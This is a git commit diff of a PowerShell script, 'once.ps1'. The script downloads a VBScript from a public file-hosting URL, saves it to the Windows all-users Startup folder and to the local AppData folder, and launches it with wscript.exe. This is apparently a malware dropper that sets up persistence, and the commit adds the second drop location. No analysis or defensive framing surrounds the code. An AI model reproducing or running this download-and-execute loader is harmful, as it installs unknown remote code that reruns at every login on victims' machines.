8f4824d419d26a6ff9ebed37b4d639bb1664e513
anaprivate <anathike4@gmail.com>
2025-06-14 20:21:56 +0000

    Update once.ps1

--- once.ps1
+++ once.ps1
@@ -1,10 +1,15 @@
 $url = "https://files.catbox.moe/xjgbuj.vbs"
-$destination = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\9lepqn.vbs"
 
+$destination1 = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\9lepqn.vbs"
 
-# Download the file
-Invoke-WebRequest -Uri $url -OutFile $destination
+$localAppData = $env:LOCALAPPDATA
+$destination2 = Join-Path $localAppData "9lepqn.vbs"
 
- # Run the VBScript
-Start-Process -FilePath "wscript.exe" -ArgumentList "`"$destination`"" -NoNewWindow 
+# Download the file to both locations
+Invoke-WebRequest -Uri $url -OutFile $destination1
+Invoke-WebRequest -Uri $url -OutFile $destination2
+
+# Run the VBScript from Startup folder location
+Start-Process -FilePath "wscript.exe" -ArgumentList "`"$destination1`"" -NoNewWindow 
+
 exit
